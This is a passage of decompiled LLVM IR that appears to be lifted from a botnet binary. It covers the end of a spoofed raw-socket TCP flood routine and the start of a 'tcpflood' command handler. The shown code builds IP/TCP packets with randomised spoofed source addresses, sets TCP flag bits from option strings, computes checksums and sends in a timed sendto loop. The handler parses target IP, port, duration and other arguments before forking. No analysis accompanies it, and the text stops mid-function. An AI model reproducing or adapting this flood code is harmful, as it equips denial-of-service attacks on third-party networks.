  %v2_1000aad8 = inttoptr i32 %v1_1000aad8 to i32*
  %v3_1000aad8 = load i32, i32* %v2_1000aad8, align 4
  %v1_1000aae4 = add i32 %tmp, 24
  %v2_1000aae4 = inttoptr i32 %v1_1000aae4 to i32*
  %v3_1000aae4 = load i32, i32* %v2_1000aae4, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_1000ab00 = icmp eq i32 %v3_1000aaa8, 0
  br i1 %v3_1000ab00, label %dec_label_pc_1000ab08, label %dec_label_pc_1000ab1c

dec_label_pc_1000ab08:                            ; preds = %dec_label_pc_1000aa90
  %v0_1000ab08 = call i32 @rand_cmwc()
  br label %dec_label_pc_1000ab34

dec_label_pc_1000ab1c:                            ; preds = %dec_label_pc_1000aa90
  %v1_1000ab20 = urem i32 %v3_1000aaa8, 65536
  store i32 %v1_1000ab20, i32* @r3, align 4
  %v1_1000ab28 = call i32 @htons(i32 %v1_1000ab20)
  br label %dec_label_pc_1000ab34

dec_label_pc_1000ab34:                            ; preds = %dec_label_pc_1000ab08, %dec_label_pc_1000ab1c
  %v2_1000ab34 = ptrtoint i32* %stack_var_-76 to i32
  %v4_1000ab44 = call i32 @getHost(i32 %v2_1000aa9c, i32* nonnull %stack_var_-72, i32 %v2_1000ab34)
  %v3_1000ab4c = icmp eq i32 %v4_1000ab44, 0
  br i1 %v3_1000ab4c, label %dec_label_pc_1000ab58, label %dec_label_pc_1000b150

dec_label_pc_1000ab58:                            ; preds = %dec_label_pc_1000ab34
  %v2_1000ab5c = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_1000ab5c, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ab70.465 to i32), i32* @lr, align 4
  %v0_1000ab6c = call i32 @__GI_memset()
  store i32 268479360, i32* @lr, align 4
  %v3_1000ab7c = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000ab8c = icmp eq i32 %v3_1000ab7c, 0
  br i1 %v3_1000ab8c, label %dec_label_pc_1000b150, label %dec_label_pc_1000ab98

dec_label_pc_1000ab98:                            ; preds = %dec_label_pc_1000ab58
  store i32 1, i32* %stack_var_-60, align 4
  %v2_1000aba0 = ptrtoint i32* %stack_var_-60 to i32
  store i32 268479420, i32* @lr, align 4
  %v5_1000abb8 = call i32 @__GI_setsockopt(i32 %v3_1000ab7c, i32 0, i32 3, i32 %v2_1000aba0, i32 4)
  %tmp60 = icmp sgt i32 %v5_1000abb8, -1
  br i1 %tmp60, label %dec_label_pc_1000abcc, label %dec_label_pc_1000b150

dec_label_pc_1000abcc:                            ; preds = %dec_label_pc_1000ab98
  %v3_1000abd0 = icmp eq i32 %v3_1000aae4, 0
  br i1 %v3_1000abd0, label %dec_label_pc_1000abfc, label %dec_label_pc_1000abe4

dec_label_pc_1000abe4:                            ; preds = %dec_label_pc_1000abcc
  br label %dec_label_pc_1000abfc

dec_label_pc_1000abfc:                            ; preds = %dec_label_pc_1000abcc, %dec_label_pc_1000abe4
  %v1_1000ac00 = add i32 %v3_1000aacc, 40
  %v1_1000ac10 = add i32 %v3_1000aacc, 70
  %v1_1000ac14 = and i32 %v1_1000ac10, -16
  %v2_1000ac1c = load i32, i32* %stack_var_-144, align 4
  %v1_1000ac24 = load i32, i32* @r1, align 4
  %v3_1000ac24 = sub i32 %v1_1000ac24, %v1_1000ac14
  %v4_1000ac24 = inttoptr i32 %v3_1000ac24 to i32*
  store i32 %v2_1000ac1c, i32* %v4_1000ac24, align 4
  %v1_1000ac34 = add i32 %v3_1000ac24, 23
  %v1_1000ac38 = and i32 %v1_1000ac34, -16
  %v1_1000ac58 = add i32 %v1_1000ac38, 20
  %v5_1000ac5c = inttoptr i32 %v1_1000ac58 to i16*
  %v3_1000ac60 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1000ac60, i32* @r29, align 4
  %v0_1000ac64 = call i32 @getspoof()
  store i32 %v0_1000ac64, i32* @r3, align 4
  %v1_1000ac70 = call i32 @htonl(i32 %v0_1000ac64)
  %v1_1000ac7c = add i32 %v3_1000aacc, 20
  %v0_1000ac84 = load i32, i32* @r29, align 4
  %v6_1000ac94 = inttoptr i32 %v1_1000ac38 to i32*
  %v7_1000ac94 = call i32 @makeIPPacket(i32* %v6_1000ac94, i32 %v0_1000ac84, i32 %v1_1000ac70, i32 6, i32 %v1_1000ac7c, i32 %v3_1000aacc)
  %v0_1000ac98 = call i32 @rand_cmwc()
  %v1_1000aca8 = trunc i32 %v0_1000ac98 to i16
  store i16 %v1_1000aca8, i16* %v5_1000ac5c, align 4
  %v0_1000acac = call i32 @rand_cmwc()
  %v2_1000acb8 = add i32 %v1_1000ac38, 24
  %v3_1000acb8 = inttoptr i32 %v2_1000acb8 to i32*
  store i32 %v0_1000acac, i32* %v3_1000acb8, align 8
  %v2_1000acc4 = add i32 %v1_1000ac38, 28
  %v3_1000acc4 = inttoptr i32 %v2_1000acc4 to i32*
  store i32 0, i32* %v3_1000acc4, align 4
  %v1_1000accc = add i32 %v1_1000ac38, 32
  %v2_1000accc = inttoptr i32 %v1_1000accc to i32*
  %v1_1000acd4 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000acd8 = add i32 %v1_1000ac38, 32
  %v3_1000acd8 = inttoptr i32 %v2_1000acd8 to i32*
  store i32 %v1_1000acd4, i32* %v3_1000acd8, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_1002b1f8.353 to i32), i32* @r4, align 4
  %v3_1000acec = inttoptr i32 %v3_1000aac0 to i8*
  %v4_1000acec = call i32 @__GI_strcoll(i8* %v3_1000acec, i32 ptrtoint ([4 x i8]* @global_var_1002b1f8.353 to i32))
  %v3_1000acf4 = icmp eq i32 %v4_1000acec, 0
  br i1 %v3_1000acf4, label %dec_label_pc_1000acfc, label %dec_label_pc_1000ad60

dec_label_pc_1000acfc:                            ; preds = %dec_label_pc_1000abfc
  %v3_1000ad00 = load i32, i32* %v2_1000accc, align 16
  %v1_1000ad54 = or i32 %v3_1000ad00, 4128768
  store i32 %v1_1000ad54, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af70

dec_label_pc_1000ad60:                            ; preds = %dec_label_pc_1000abfc
  store i32 ptrtoint ([5 x i8]* @global_var_1002b1fc.354 to i32), i32* @r4, align 4
  %v4_1000ad70 = call i32 @__GI_strcoll(i8* %v3_1000acec, i32 ptrtoint ([5 x i8]* @global_var_1002b1fc.354 to i32))
  %v3_1000ad78 = icmp eq i32 %v4_1000ad70, 0
  br i1 %v3_1000ad78, label %dec_label_pc_1000ad80, label %dec_label_pc_1000adb4

dec_label_pc_1000ad80:                            ; preds = %dec_label_pc_1000ad60
  %v3_1000ad84 = load i32, i32* %v2_1000accc, align 16
  %v1_1000ada8 = or i32 %v3_1000ad84, 2686976
  store i32 %v1_1000ada8, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af70

dec_label_pc_1000adb4:                            ; preds = %dec_label_pc_1000ad60
  store i32 ptrtoint ([5 x i8]* @global_var_1002b204.355 to i32), i32* @r4, align 4
  %v4_1000adc4 = call i32 @__GI_strcoll(i8* %v3_1000acec, i32 ptrtoint ([5 x i8]* @global_var_1002b204.355 to i32))
  %v3_1000adcc = icmp eq i32 %v4_1000adc4, 0
  br i1 %v3_1000adcc, label %dec_label_pc_1000add4, label %dec_label_pc_1000adf8

dec_label_pc_1000add4:                            ; preds = %dec_label_pc_1000adb4
  %v3_1000add8 = load i32, i32* %v2_1000accc, align 16
  %v1_1000adec = or i32 %v3_1000add8, 2228224
  store i32 %v1_1000adec, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af70

dec_label_pc_1000adf8:                            ; preds = %dec_label_pc_1000adb4
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268480012, i32* @lr, align 4
  %v4_1000ae08 = call i32 @__GI_strtok(i32 %v3_1000aac0, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000af6817 = icmp eq i32 %v4_1000ae08, 0
  br i1 %v3_1000af6817, label %dec_label_pc_1000af70, label %dec_label_pc_1000ae18

dec_label_pc_1000ae18:                            ; preds = %dec_label_pc_1000adf8, %dec_label_pc_1000af4c
  %storemerge1218 = phi i32 [ %v4_1000af58, %dec_label_pc_1000af4c ], [ %v4_1000ae08, %dec_label_pc_1000adf8 ]
  store i32 ptrtoint ([4 x i8]* @global_var_1002b220.359 to i32), i32* @r4, align 4
  %v3_1000ae28 = inttoptr i32 %storemerge1218 to i8*
  %v4_1000ae28 = call i32 @__GI_strcoll(i8* %v3_1000ae28, i32 ptrtoint ([4 x i8]* @global_var_1002b220.359 to i32))
  %v3_1000ae30 = icmp eq i32 %v4_1000ae28, 0
  br i1 %v3_1000ae30, label %dec_label_pc_1000ae38, label %dec_label_pc_1000ae4c

dec_label_pc_1000ae38:                            ; preds = %dec_label_pc_1000ae18
  %v3_1000ae3c = load i32, i32* %v2_1000accc, align 16
  %v1_1000ae40 = or i32 %v3_1000ae3c, 131072
  store i32 %v1_1000ae40, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af4c

dec_label_pc_1000ae4c:                            ; preds = %dec_label_pc_1000ae18
  store i32 ptrtoint ([4 x i8]* @global_var_1002b224.360 to i32), i32* @r4, align 4
  %v4_1000ae5c = call i32 @__GI_strcoll(i8* %v3_1000ae28, i32 ptrtoint ([4 x i8]* @global_var_1002b224.360 to i32))
  %v3_1000ae64 = icmp eq i32 %v4_1000ae5c, 0
  br i1 %v3_1000ae64, label %dec_label_pc_1000ae6c, label %dec_label_pc_1000ae80

dec_label_pc_1000ae6c:                            ; preds = %dec_label_pc_1000ae4c
  %v3_1000ae70 = load i32, i32* %v2_1000accc, align 16
  %v1_1000ae74 = or i32 %v3_1000ae70, 262144
  store i32 %v1_1000ae74, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af4c

dec_label_pc_1000ae80:                            ; preds = %dec_label_pc_1000ae4c
  store i32 ptrtoint ([4 x i8]* @global_var_1002b228.361 to i32), i32* @r4, align 4
  %v4_1000ae90 = call i32 @__GI_strcoll(i8* %v3_1000ae28, i32 ptrtoint ([4 x i8]* @global_var_1002b228.361 to i32))
  %v3_1000ae98 = icmp eq i32 %v4_1000ae90, 0
  br i1 %v3_1000ae98, label %dec_label_pc_1000aea0, label %dec_label_pc_1000aeb4

dec_label_pc_1000aea0:                            ; preds = %dec_label_pc_1000ae80
  %v3_1000aea4 = load i32, i32* %v2_1000accc, align 16
  %v1_1000aea8 = or i32 %v3_1000aea4, 65536
  store i32 %v1_1000aea8, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af4c

dec_label_pc_1000aeb4:                            ; preds = %dec_label_pc_1000ae80
  store i32 ptrtoint ([4 x i8]* @global_var_1002b22c.362 to i32), i32* @r4, align 4
  %v4_1000aec4 = call i32 @__GI_strcoll(i8* %v3_1000ae28, i32 ptrtoint ([4 x i8]* @global_var_1002b22c.362 to i32))
  %v3_1000aecc = icmp eq i32 %v4_1000aec4, 0
  br i1 %v3_1000aecc, label %dec_label_pc_1000aed4, label %dec_label_pc_1000aee8

dec_label_pc_1000aed4:                            ; preds = %dec_label_pc_1000aeb4
  %v3_1000aed8 = load i32, i32* %v2_1000accc, align 16
  %v1_1000aedc = or i32 %v3_1000aed8, 1048576
  store i32 %v1_1000aedc, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af4c

dec_label_pc_1000aee8:                            ; preds = %dec_label_pc_1000aeb4
  store i32 ptrtoint ([4 x i8]* @global_var_1002b230.363 to i32), i32* @r4, align 4
  %v4_1000aef8 = call i32 @__GI_strcoll(i8* %v3_1000ae28, i32 ptrtoint ([4 x i8]* @global_var_1002b230.363 to i32))
  %v3_1000af00 = icmp eq i32 %v4_1000aef8, 0
  br i1 %v3_1000af00, label %dec_label_pc_1000af08, label %dec_label_pc_1000af1c

dec_label_pc_1000af08:                            ; preds = %dec_label_pc_1000aee8
  %v3_1000af0c = load i32, i32* %v2_1000accc, align 16
  %v1_1000af10 = or i32 %v3_1000af0c, 524288
  store i32 %v1_1000af10, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af4c

dec_label_pc_1000af1c:                            ; preds = %dec_label_pc_1000aee8
  store i32 ptrtoint ([4 x i8]* @global_var_1002b234.364 to i32), i32* @r4, align 4
  %v4_1000af2c = call i32 @__GI_strcoll(i8* %v3_1000ae28, i32 ptrtoint ([4 x i8]* @global_var_1002b234.364 to i32))
  %v3_1000af34 = icmp eq i32 %v4_1000af2c, 0
  br i1 %v3_1000af34, label %dec_label_pc_1000af3c, label %dec_label_pc_1000af4c

dec_label_pc_1000af3c:                            ; preds = %dec_label_pc_1000af1c
  %v3_1000af40 = load i32, i32* %v2_1000accc, align 16
  %v1_1000af44 = or i32 %v3_1000af40, 2097152
  store i32 %v1_1000af44, i32* %v2_1000accc, align 16
  br label %dec_label_pc_1000af4c

dec_label_pc_1000af4c:                            ; preds = %dec_label_pc_1000af1c, %dec_label_pc_1000af08, %dec_label_pc_1000aed4, %dec_label_pc_1000aea0, %dec_label_pc_1000ae6c, %dec_label_pc_1000ae38, %dec_label_pc_1000af3c
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268480348, i32* @lr, align 4
  %v4_1000af58 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v3_1000af68 = icmp eq i32 %v4_1000af58, 0
  br i1 %v3_1000af68, label %dec_label_pc_1000af70, label %dec_label_pc_1000ae18

dec_label_pc_1000af70:                            ; preds = %dec_label_pc_1000af4c, %dec_label_pc_1000adf8, %dec_label_pc_1000add4, %dec_label_pc_1000ad80, %dec_label_pc_1000acfc
  %v3_1000af78 = add i32 %v1_1000ac38, 34
  %v4_1000af78 = inttoptr i32 %v3_1000af78 to i16*
  store i16 2048, i16* %v4_1000af78, align 2
  %v3_1000af84 = add i32 %v1_1000ac38, 36
  %v4_1000af84 = inttoptr i32 %v3_1000af84 to i16*
  store i16 0, i16* %v4_1000af84, align 4
  %v3_1000af90 = add i32 %v1_1000ac38, 38
  %v4_1000af90 = inttoptr i32 %v3_1000af90 to i16*
  store i16 0, i16* %v4_1000af90, align 2
  br i1 %v3_1000ab00, label %dec_label_pc_1000afa0, label %dec_label_pc_1000afb4

dec_label_pc_1000afa0:                            ; preds = %dec_label_pc_1000af70
  %v0_1000afa0 = call i32 @rand_cmwc()
  %extract.t64 = trunc i32 %v0_1000afa0 to i16
  br label %dec_label_pc_1000afcc

dec_label_pc_1000afb4:                            ; preds = %dec_label_pc_1000af70
  %v1_1000afb8 = urem i32 %v3_1000aaa8, 65536
  store i32 %v1_1000afb8, i32* @r3, align 4
  %v1_1000afc0 = call i32 @htons(i32 %v1_1000afb8)
  %extract.t = trunc i32 %v1_1000afc0 to i16
  br label %dec_label_pc_1000afcc

dec_label_pc_1000afcc:                            ; preds = %dec_label_pc_1000afa0, %dec_label_pc_1000afb4
  %storemerge61.off0 = phi i16 [ %extract.t, %dec_label_pc_1000afb4 ], [ %extract.t64, %dec_label_pc_1000afa0 ]
  %v3_1000afd4 = add i32 %v1_1000ac38, 22
  %v4_1000afd4 = inttoptr i32 %v3_1000afd4 to i16*
  store i16 %storemerge61.off0, i16* %v4_1000afd4, align 2
  %v2_1000afe8 = inttoptr i32 %v1_1000ac38 to i16*
  %v3_1000afe8 = call i32 @csum(i16* %v2_1000afe8, i32 %v1_1000ac58)
  %v1_1000aff4 = trunc i32 %v3_1000afe8 to i16
  store i16 %v1_1000aff4, i16* %v4_1000af84, align 4
  %v1_1000b004 = or i32 %v1_1000ac38, 2
  %v2_1000b004 = inttoptr i32 %v1_1000b004 to i16*
  %v3_1000b004 = load i16, i16* %v2_1000b004, align 2
  %v4_1000b004 = zext i16 %v3_1000b004 to i32
  %v3_1000b014 = call i32 @csum(i16* %v2_1000afe8, i32 %v4_1000b004)
  %sext3 = mul i32 %v3_1000b014, 65536
  %v1_1000b018 = sdiv i32 %sext3, 65536
  %v1_1000b020 = trunc i32 %v1_1000b018 to i16
  %v3_1000b020 = or i32 %v1_1000ac38, 10
  %v4_1000b020 = inttoptr i32 %v3_1000b020 to i16*
  store i16 %v1_1000b020, i16* %v4_1000b020, align 2
  store i32 268480556, i32* @lr, align 4
  %v1_1000b028 = call i32 @__GI_time(i32 0)
  %v2_1000b034 = add i32 %v1_1000b028, %v3_1000aab4
  %v2_1000b078 = or i32 %v1_1000ac38, 12
  %v3_1000b078 = inttoptr i32 %v2_1000b078 to i32*
  %v3_1000b08c = or i32 %v1_1000ac38, 4
  %v4_1000b08c = inttoptr i32 %v3_1000b08c to i16*
  br label %dec_label_pc_1000b048

dec_label_pc_1000b048:                            ; preds = %dec_label_pc_1000b048.backedge, %dec_label_pc_1000afcc
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_1000afcc ], [ %storemerge21, %dec_label_pc_1000b048.backedge ]
  store i32 268480620, i32* @lr, align 4
  %v6_1000b068 = call i32 @sendto(i32 %v3_1000ab7c, i32 %v1_1000ac38, i32 %v1_1000ac00, i32 0, i32 %v2_1000ab34, i32 16)
  %v0_1000b06c = call i32 @getspoof()
  store i32 %v0_1000b06c, i32* %v3_1000b078, align 4
  %v0_1000b07c = call i32 @rand_cmwc()
  %v1_1000b08c = trunc i32 %v0_1000b07c to i16
  store i16 %v1_1000b08c, i16* %v4_1000b08c, align 4
  %v0_1000b090 = call i32 @rand_cmwc()
  store i32 %v0_1000b090, i32* %v3_1000acb8, align 8
  %v0_1000b0a0 = call i32 @rand_cmwc()
  %v1_1000b0b0 = trunc i32 %v0_1000b0a0 to i16
  store i16 %v1_1000b0b0, i16* %v5_1000ac5c, align 4
  store i16 0, i16* %v4_1000af84, align 4
  %v3_1000b0d0 = call i32 @csum(i16* %v2_1000afe8, i32 %v1_1000ac58)
  %v1_1000b0dc = trunc i32 %v3_1000b0d0 to i16
  store i16 %v1_1000b0dc, i16* %v4_1000af84, align 4
  %v3_1000b0ec = load i16, i16* %v2_1000b004, align 2
  %v4_1000b0ec = zext i16 %v3_1000b0ec to i32
  %v3_1000b0fc = call i32 @csum(i16* %v2_1000afe8, i32 %v4_1000b0ec)
  %v1_1000b108 = trunc i32 %v3_1000b0fc to i16
  store i16 %v1_1000b108, i16* %v4_1000b020, align 2
  %v4_1000b114 = icmp eq i32 %stack_var_-52.0, %v3_1000aad8
  br i1 %v4_1000b114, label %dec_label_pc_1000b11c, label %dec_label_pc_1000b140

dec_label_pc_1000b11c:                            ; preds = %dec_label_pc_1000b048
  store i32 268480804, i32* @lr, align 4
  %v1_1000b120 = call i32 @__GI_time(i32 0)
  %v3_1000b12c = icmp sgt i32 %v1_1000b120, %v2_1000b034
  br i1 %v3_1000b12c, label %dec_label_pc_1000b150, label %dec_label_pc_1000b048.backedge

dec_label_pc_1000b048.backedge:                   ; preds = %dec_label_pc_1000b11c, %dec_label_pc_1000b140
  %storemerge21 = phi i32 [ %v1_1000b144, %dec_label_pc_1000b140 ], [ 0, %dec_label_pc_1000b11c ]
  br label %dec_label_pc_1000b048

dec_label_pc_1000b140:                            ; preds = %dec_label_pc_1000b048
  %v1_1000b144 = add i32 %stack_var_-52.0, 1
  br label %dec_label_pc_1000b048.backedge

dec_label_pc_1000b150:                            ; preds = %dec_label_pc_1000b11c, %dec_label_pc_1000ab98, %dec_label_pc_1000ab58, %dec_label_pc_1000ab34, %entry
  %v0_1000b178 = phi i32 [ %v5_1000abb8, %dec_label_pc_1000ab98 ], [ 0, %dec_label_pc_1000ab58 ], [ %v4_1000ab44, %dec_label_pc_1000ab34 ], [ %v0_1000aa7c, %entry ], [ %v1_1000b120, %dec_label_pc_1000b11c ]
  ret i32 %v0_1000b178

; uselistorder directives
  uselistorder i16* %v2_1000afe8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000afb8, { 1, 0 }
  uselistorder i32 %v4_1000af58, { 1, 0 }
  uselistorder i32* %v2_1000accc, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 %v1_1000ac38, { 12, 1, 2, 3, 4, 13, 5, 6, 7, 8, 0, 9, 10, 11, 14, 15 }
  uselistorder i32 %v2_1000ab34, { 1, 0 }
  uselistorder i32 %v1_1000ab20, { 1, 0 }
  uselistorder i32 %v3_1000aacc, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 (i16*, i32)* @csum, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 19, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b234.364 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b230.363 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b22c.362 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b228.361 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b224.360 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b220.359 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1002b204.355 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1002b1fc.354 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b1f8.353 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @htonl, { 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @getspoof, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000b048.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000afcc, { 1, 0 }
  uselistorder label %dec_label_pc_1000af4c, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000ae18, { 1, 0 }
  uselistorder label %dec_label_pc_1000abfc, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab34, { 1, 0 }
}

define i32 @tcpflood(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000b17c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000b17c, i32* %stack_var_-112, align 4
  %v1_1000b1ac = call i32 @mfork(i32 %arg2)
  %v3_1000b1b4 = icmp eq i32 %v1_1000b1ac, 0
  br i1 %v3_1000b1b4, label %dec_label_pc_1000b1bc, label %dec_label_pc_1000b538

dec_label_pc_1000b1bc:                            ; preds = %entry
  %tmp33 = icmp slt i32 %arg3, 7
  br i1 %tmp33, label %dec_label_pc_1000b268, label %dec_label_pc_1000b1c8

dec_label_pc_1000b1c8:                            ; preds = %dec_label_pc_1000b1bc
  %v1_1000b1cc = add i32 %arg4, 12
  %v1_1000b1d0 = inttoptr i32 %v1_1000b1cc to i32*
  %v2_1000b1d0 = load i32, i32* %v1_1000b1d0, align 4
  store i32 268480988, i32* @lr, align 4
  %v1_1000b1d8 = call i32 @atol(i32 %v2_1000b1d0)
  %v4_1000b1e4 = icmp eq i32 %v1_1000b1d8, -1
  br i1 %v4_1000b1e4, label %dec_label_pc_1000b268, label %dec_label_pc_1000b1ec

dec_label_pc_1000b1ec:                            ; preds = %dec_label_pc_1000b1c8
  %v1_1000b1f0 = add i32 %arg4, 8
  %v1_1000b1f4 = inttoptr i32 %v1_1000b1f0 to i32*
  %v2_1000b1f4 = load i32, i32* %v1_1000b1f4, align 4
  store i32 268481024, i32* @lr, align 4
  %v1_1000b1fc = call i32 @atol(i32 %v2_1000b1f4)
  %v4_1000b208 = icmp eq i32 %v1_1000b1fc, -1
  br i1 %v4_1000b208, label %dec_label_pc_1000b268, label %dec_label_pc_1000b21c

dec_label_pc_1000b21c:                            ; preds = %dec_label_pc_1000b1ec
  %v1_1000b220 = add i32 %arg4, 20
  %v1_1000b224 = inttoptr i32 %v1_1000b220 to i32*
  %v2_1000b224 = load i32, i32* %v1_1000b224, align 4
  store i32 268481072, i32* @lr, align 4
  %v1_1000b22c = call i32 @atol(i32 %v2_1000b224)
  %v1_1000b234 = icmp slt i32 %v1_1000b22c, 0
  br i1 %v1_1000b234, label %dec_label_pc_1000b268, label %dec_label_pc_1000b23c

dec_label_pc_1000b23c:                            ; preds = %dec_label_pc_1000b21c
  %v3_1000b240 = icmp eq i32 %arg3, 7
  br i1 %v3_1000b240, label %dec_label_pc_1000b248, label %dec_label_pc_1000b30c

dec_label_pc_1000b248:                            ; preds = %dec_label_pc_1000b23c
  %v1_1000b24c = add i32 %arg4, 24
  %v1_1000b250 = inttoptr i32 %v1_1000b24c to i32*
  %v2_1000b250 = load i32, i32* %v1_1000b250, align 4
  store i32 268481116, i32* @lr, align 4
  %v1_1000b258 = call i32 @atol(i32 %v2_1000b250)
  %v2_1000b260 = icmp sgt i32 %v1_1000b258, 0
  br i1 %v2_1000b260, label %dec_label_pc_1000b30c, label %dec_label_pc_1000b268

dec_label_pc_1000b268:                            ; preds = %dec_label_pc_1000b248, %dec_label_pc_1000b21c, %dec_label_pc_1000b1ec, %dec_label_pc_1000b1c8, %dec_label_pc_1000b1bc
  %v6_1000b27c = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_1002ba30.466 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000b538

dec_label_pc_1000b30c:                            ; preds = %dec_label_pc_1000b23c, %dec_label_pc_1000b248
  %v1_1000b288 = add i32 %arg4, 4
  %v1_1000b28c = inttoptr i32 %v1_1000b288 to i32*
  %v2_1000b28c = load i32, i32* %v1_1000b28c, align 4
  %v2_1000b29c = load i32, i32* %v1_1000b1f4, align 4
  store i32 268481192, i32* @lr, align 4
  %v1_1000b2a4 = call i32 @atol(i32 %v2_1000b29c)
  %v2_1000b2b8 = load i32, i32* %v1_1000b1d0, align 4
  store i32 268481220, i32* @lr, align 4
  %v1_1000b2c0 = call i32 @atol(i32 %v2_1000b2b8)
  %v1_1000b2d0 = add i32 %arg4, 16
  %v1_1000b2d4 = inttoptr i32 %v1_1000b2d0 to i32*
  %v2_1000b2d4 = load i32, i32* %v1_1000b2d4, align 4
  %v2_1000b2f0 = load i32, i32* %v1_1000b224, align 4
  store i32 268481276, i32* @lr, align 4
  %v1_1000b2f8 = call i32 @atol(i32 %v2_1000b2f0)
  br i1 %v3_1000b240, label %dec_label_pc_1000b320, label %dec_label_pc_1000b33c

dec_label_pc_1000b320:                            ; preds = %dec_label_pc_1000b30c
  %v1_1000b324 = add i32 %arg4, 24
  %v1_1000b328 = inttoptr i32 %v1_1000b324 to i32*
  %v2_1000b328 = load i32, i32* %v1_1000b328, align 4
  store i32 268481332, i32* @lr, align 4
  %v1_1000b330 = call i32 @atol(i32 %v2_1000b328)
  br label %dec_label_pc_1000b344

dec_label_pc_1000b33c:                            ; preds = %dec_label_pc_1000b30c
  br label %dec_label_pc_1000b344

dec_label_pc_1000b344:                            ; preds = %dec_label_pc_1000b320, %dec_label_pc_1000b33c
  %storemerge1 = phi i32 [ 10, %dec_label_pc_1000b33c ], [ %v1_1000b330, %dec_label_pc_1000b320 ]
  %v1_1000b350 = add i32 %arg4, 28
  %v1_1000b354 = inttoptr i32 %v1_1000b350 to i32*
  %v2_1000b354 = load i32, i32* %v1_1000b354, align 4
  store i32 268481376, i32* @lr, align 4
  %v1_1000b35c = call i32 @atol(i32 %v2_1000b354)
  %v2_1000b380 = load i32, i32* %v1_1000b28c, align 4
  store i32 268481420, i32* @lr, align 4
  %v1_1000b388 = call i32 @inet_addr(i32 %v2_1000b380)
  %v1_1000b398 = mul i32 %v1_1000b35c, 28
  %v1_1000b3a0 = add i32 %v1_1000b398, 30
  %v1_1000b3a4 = and i32 %v1_1000b3a0, -16
  %v2_1000b3ac = load i32, i32* %stack_var_-112, align 4
  %v1_1000b3b4 = load i32, i32* @r1, align 4
  %v3_1000b3b4 = sub i32 %v1_1000b3b4, %v1_1000b3a4
  %v4_1000b3b4 = inttoptr i32 %v3_1000b3b4 to i32*
  store i32 %v2_1000b3ac, i32* %v4_1000b3b4, align 4
  %v1_1000b3c4 = add i32 %v3_1000b3b4, 23
  %v1_1000b3c8 = and i32 %v1_1000b3c4, -16
  store i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32* @r4, align 4
  store i32 268481520, i32* @lr, align 4
  %v4_1000b3ec = call i32 @__GI_strtok(i32 %v2_1000b28c, i32 ptrtoint (i32* @global_var_1002b21c.358 to i32), i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v1_1000b4ec = add i32 %v1_1000b35c, -1
  %v3_1000b4f45 = icmp sgt i32 %v1_1000b4ec, 0
